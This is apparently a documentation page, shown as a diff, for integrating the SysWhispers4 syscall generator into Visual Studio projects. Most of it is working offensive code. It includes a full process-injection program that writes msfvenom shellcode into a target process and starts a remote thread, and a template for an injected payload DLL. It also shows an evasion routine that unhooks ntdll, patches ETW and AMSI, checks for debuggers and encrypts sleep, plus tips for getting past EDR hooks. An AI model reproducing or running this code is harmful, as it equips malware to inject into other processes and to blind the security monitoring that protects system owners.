@@ -1,0 +1,504 @@
+---
+title: 'Integration with MSVC'
+description: 'Complete guide to integrating SysWhispers4 with MSVC and Visual Studio projects'
+icon: 'microsoft'
+---
+
+## Overview
+
+This guide covers complete integration of SysWhispers4 with Microsoft Visual Studio (MSVC) projects, including console applications, DLLs, and shellcode loaders.
+
+## Quick Integration
+
+<Steps>
+  <Step title="Generate MSVC-compatible files">
+    ```bash
+    python syswhispers.py --preset injection --compiler msvc
+    ```
+    
+    **Generated files:**
+    - `SW4Syscalls_Types.h`
+    - `SW4Syscalls.h`
+    - `SW4Syscalls.c`
+    - `SW4Syscalls.asm` ← MASM assembly file
+  </Step>
+
+  <Step title="Add files to Visual Studio project">
+    1. Right-click project in Solution Explorer → **Add → Existing Item**
+    2. Select all 4 generated files
+    3. Click **Add**
+  </Step>
+
+  <Step title="Enable MASM build customization">
+    1. Right-click project → **Build Customizations...**
+    2. Check **masm (.targets, .props)**
+    3. Click **OK**
+    
+    <Note>
+      This allows Visual Studio to compile `.asm` files using the Microsoft Macro Assembler (MASM).
+    </Note>
+  </Step>
+
+  <Step title="Include the header and initialize">
+    ```c
+    #include "SW4Syscalls.h"
+    
+    int main(void) {
+        // Initialize syscall number resolution
+        if (!SW4_Initialize()) {
+            fprintf(stderr, "[!] Failed to initialize SysWhispers\n");
+            return 1;
+        }
+        
+        // Use NT functions...
+        return 0;
+    }
+    ```
+  </Step>
+
+  <Step title="Build the project">
+    Press **F7** or select **Build → Build Solution**
+    
+    Expected output:
+    ```
+    1>------ Build started: Project: MyProject, Configuration: Release x64 ------
+    1>SW4Syscalls.c
+    1>Assembling: SW4Syscalls.asm
+    1>main.c
+    1>MyProject.vcxproj -> C:\...\x64\Release\MyProject.exe
+    ```
+  </Step>
+</Steps>
+
+## Complete Console Application Example
+
+### Project Setup
+
+<Steps>
+  <Step title="Create new Visual Studio project">
+    1. **File → New → Project**
+    2. Select **Console App**
+    3. Name: `SyscallInjector`
+    4. Click **Create**
+  </Step>
+
+  <Step title="Generate SysWhispers4 files">
+    ```bash
+    python syswhispers.py --preset injection \
+        --method indirect --resolve freshycalls \
+        --compiler msvc --out-file Syscalls
+    ```
+  </Step>
+
+  <Step title="Add files to project">
+    Copy the 4 generated files to your project directory, then add them to the project:
+    
+    - `Syscalls_Types.h`
+    - `Syscalls.h`
+    - `Syscalls.c`
+    - `Syscalls.asm`
+  </Step>
+
+  <Step title="Enable MASM">
+    Right-click project → **Build Customizations** → check **masm**
+  </Step>
+</Steps>
+
+### Source Code
+
+**main.c:**
+```c
+#include <stdio.h>
+#include <Windows.h>
+#include "Syscalls.h"
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char shellcode[] = {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+    0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+    // ... full shellcode here ...
+};
+
+int main(int argc, char* argv[]) {
+    printf("[*] SysWhispers4 Process Injection Example\n");
+    
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
+        return 1;
+    }
+    
+    DWORD targetPid = atoi(argv[1]);
+    printf("[*] Target PID: %lu\n", targetPid);
+    
+    // ===== Initialize SysWhispers4 =====
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] SW4_Initialize failed\n");
+        return 1;
+    }
+    printf("[+] Initialized syscall stubs\n");
+    
+    // ===== Open target process =====
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };
+    
+    NTSTATUS status = SW4_NtOpenProcess(
+        &hProcess,
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        &objAttr,
+        &cid
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtOpenProcess failed: 0x%08X\n", status);
+        return 1;
+    }
+    printf("[+] Opened process: handle 0x%p\n", hProcess);
+    
+    // ===== Allocate RWX memory =====
+    PVOID remoteBase = NULL;
+    SIZE_T regionSize = sizeof(shellcode);
+    
+    status = SW4_NtAllocateVirtualMemory(
+        hProcess,
+        &remoteBase,
+        0,
+        &regionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Allocated %llu bytes at 0x%p\n", (ULONG64)regionSize, remoteBase);
+    
+    // ===== Write shellcode =====
+    SIZE_T written = 0;
+    status = SW4_NtWriteVirtualMemory(
+        hProcess,
+        remoteBase,
+        shellcode,
+        sizeof(shellcode),
+        &written
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Wrote %llu bytes\n", (ULONG64)written);
+    
+    // ===== Change protection to RX =====
+    ULONG oldProtect = 0;
+    status = SW4_NtProtectVirtualMemory(
+        hProcess,
+        &remoteBase,
+        &regionSize,
+        PAGE_EXECUTE_READ,
+        &oldProtect
+    );
+    printf("[+] Changed protection to RX\n");
+    
+    // ===== Create remote thread =====
+    HANDLE hThread = NULL;
+    status = SW4_NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        remoteBase,  // start address = shellcode
+        NULL,        // parameter
+        0,           // flags (0 = run immediately)
+        0, 0, 0, NULL
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Remote thread created: handle 0x%p\n", hThread);
+    
+    // ===== Wait and cleanup =====
+    printf("[*] Waiting for thread completion...\n");
+    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+    
+    SW4_NtClose(hThread);
+    SW4_NtClose(hProcess);
+    
+    printf("[+] Done.\n");
+    return 0;
+}
+```
+
+### Build Configuration
+
+**Recommended settings for Release build:**
+
+1. **Configuration Properties → General**
+   - Configuration Type: `Application (.exe)`
+   - Platform Toolset: `Visual Studio 2022 (v143)`
+   
+2. **C/C++ → General**
+   - Warning Level: `Level3 (/W3)`
+   
+3. **C/C++ → Optimization** (Release only)
+   - Optimization: `Maximum Optimization (/O2)`
+   - Inline Function Expansion: `Any Suitable (/Ob2)`
+   
+4. **Linker → General**
+   - Enable Incremental Linking: `No`
+   
+5. **Linker → Advanced**
+   - Randomized Base Address: `Yes (/DYNAMICBASE)`
+
+### Build Output Example
+
+```
+1>------ Build started: Project: SyscallInjector, Configuration: Release x64 ------
+1>Syscalls.c
+1>Assembling: Syscalls.asm
+1>main.c
+1>Generating code
+1>Previous IPDB not found, fall back to full compilation.
+1>All 245 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+1>Finished generating code
+1>SyscallInjector.vcxproj -> C:\...\x64\Release\SyscallInjector.exe
+========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+```
+
+## DLL Project Integration
+
+<Steps>
+  <Step title="Create DLL project">
+    1. **File → New → Project**
+    2. Select **Dynamic-Link Library (DLL)**
+    3. Name: `InjectionPayload`
+  </Step>
+
+  <Step title="Generate syscall stubs">
+    ```bash
+    python syswhispers.py --preset common \
+        --method indirect --compiler msvc
+    ```
+  </Step>
+
+  <Step title="Add files and enable MASM">
+    Add the 4 generated files and enable MASM build customization.
+  </Step>
+
+  <Step title="Implement DllMain">
+    **dllmain.c:**
+    ```c
+    #include <Windows.h>
+    #include "SW4Syscalls.h"
+    
+    BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+        if (dwReason == DLL_PROCESS_ATTACH) {
+            DisableThreadLibraryCalls(hModule);
+            
+            // Initialize syscalls
+            if (!SW4_Initialize()) {
+                return FALSE;
+            }
+            
+            // Your payload logic here
+            MessageBoxA(NULL, "Injected via syscalls!", "Success", MB_OK);
+        }
+        return TRUE;
+    }
+    ```
+  </Step>
+
+  <Step title="Build DLL">
+    Press **F7** to build. Output: `InjectionPayload.dll`
+  </Step>
+</Steps>
+
+## Advanced MSVC Features
+
+### Using Evasion Features
+
+**Generate with all evasion enabled:**
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --stack-spoof \
+    --etw-bypass --amsi-bypass --unhook-ntdll \
+    --anti-debug --sleep-encrypt \
+    --compiler msvc
+```
+
+**Initialize in correct order:**
+```c
+int main(void) {
+    // Step 1: Remove hooks BEFORE initialization
+    SW4_UnhookNtdll();
+    
+    // Step 2: Resolve SSNs
+    if (!SW4_Initialize()) return 1;
+    
+    // Step 3: Apply evasion patches
+    SW4_PatchEtw();
+    SW4_PatchAmsi();
+    
+    // Step 4: Verify clean environment
+    if (!SW4_AntiDebugCheck()) {
+        // Debugger detected
+        return 0;
+    }
+    
+    // Step 5: Your payload
+    // ...
+    
+    // Step 6: Use encrypted sleep
+    SW4_SleepEncrypt(5000);  // instead of Sleep(5000)
+    
+    return 0;
+}
+```
+
+### Egg Hunt Method
+
+**Generate:**
+```bash
+python syswhispers.py --preset injection \
+    --method egg --compiler msvc
+```
+
+**Usage:**
+```c
+int main(void) {
+    // CRITICAL: Hatch eggs BEFORE Initialize
+    SW4_HatchEggs();    // Replaces eggs with syscall opcodes
+    SW4_Initialize();
+    
+    // Now use NT functions
+    // ...
+}
+```
+
+### Multi-Architecture Builds
+
+**x64 Configuration:**
+```bash
+python syswhispers.py --preset common --arch x64 --compiler msvc
+```
+
+**x86 Configuration:**
+```bash
+python syswhispers.py --preset common --arch x86 --compiler msvc
+```
+
+**WoW64 (32-bit PE, 64-bit syscalls):**
+```bash
+python syswhispers.py --preset common --arch wow64 --compiler msvc
+```
+
+Create separate configurations in Visual Studio for each architecture.
+
+## Troubleshooting
+
+### Error: "MASM not found"
+
+**Solution:**
+1. Install **Desktop development with C++** workload in Visual Studio Installer
+2. Ensure **MSVC v143 - VS 2022 C++ x64/x86 build tools** is installed
+3. Enable **masm** in **Build Customizations**
+
+### Error: "Unresolved external symbol SW4_NtAllocateVirtualMemory"
+
+**Cause:** ASM file not being compiled.
+
+**Solution:**
+1. Verify `SW4Syscalls.asm` is in the project
+2. Right-click `SW4Syscalls.asm` → **Properties**
+3. Check **Item Type** is set to `Microsoft Macro Assembler`
+4. Rebuild project
+
+### Error: "A2008: syntax error : syscall"
+
+**Cause:** Trying to use x64 instructions in x86 build.
+
+**Solution:**
+- Ensure project platform is `x64` (not `Win32`)
+- Or regenerate with `--arch x86` for 32-bit target
+
+### Warning: "C4996: 'strcpy': This function or variable may be unsafe"
+
+**Solution:** Add to preprocessor definitions:
+```
+_CRT_SECURE_NO_WARNINGS
+```
+
+Or use secure functions (`strcpy_s`, `sprintf_s`).
+
+### Initialization Fails
+
+**Symptoms:** `SW4_Initialize()` returns 0/FALSE.
+
+**Debugging:**
+```c
+if (!SW4_Initialize()) {
+    DWORD err = GetLastError();
+    fprintf(stderr, "[!] Init failed, last error: %lu\n", err);
+    
+    // Check ntdll is loaded
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+        fprintf(stderr, "[!] ntdll.dll not found\n");
+    }
+}
+```
+
+**Common causes:**
+- Incompatible resolution method for Windows version
+- Permissions issue (for `from_disk` method)
+- Heavy EDR hooks (try `--resolve recycled` or `--resolve from_disk`)
+
+## Best Practices
+
+1. **Always initialize before use:**
+   ```c
+   if (!SW4_Initialize()) { /* handle error */ }
+   ```
+
+2. **Check NTSTATUS return values:**
+   ```c
+   NTSTATUS st = SW4_NtAllocateVirtualMemory(...);
+   if (!NT_SUCCESS(st)) {
+       fprintf(stderr, "[!] Failed: 0x%08X\n", st);
+   }
+   ```
+
+3. **Close handles:**
+   ```c
+   SW4_NtClose(hProcess);
+   SW4_NtClose(hThread);
+   ```
+
+4. **Unhook before initialize:**
+   ```c
+   SW4_UnhookNtdll();  // FIRST
+   SW4_Initialize();   // SECOND
+   ```
+
+5. **Use Release builds for testing:**
+   Debug builds add extra symbols and checks that affect evasion.
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="MinGW Integration" icon="code" href="/guides/integration-mingw">
+    Alternative compiler: MinGW and Clang
+  </Card>
+  <Card title="Advanced Evasion" icon="shield-halved" href="/guides/advanced-evasion">
+    Learn about all evasion techniques
+  </Card>
+</CardGroup>
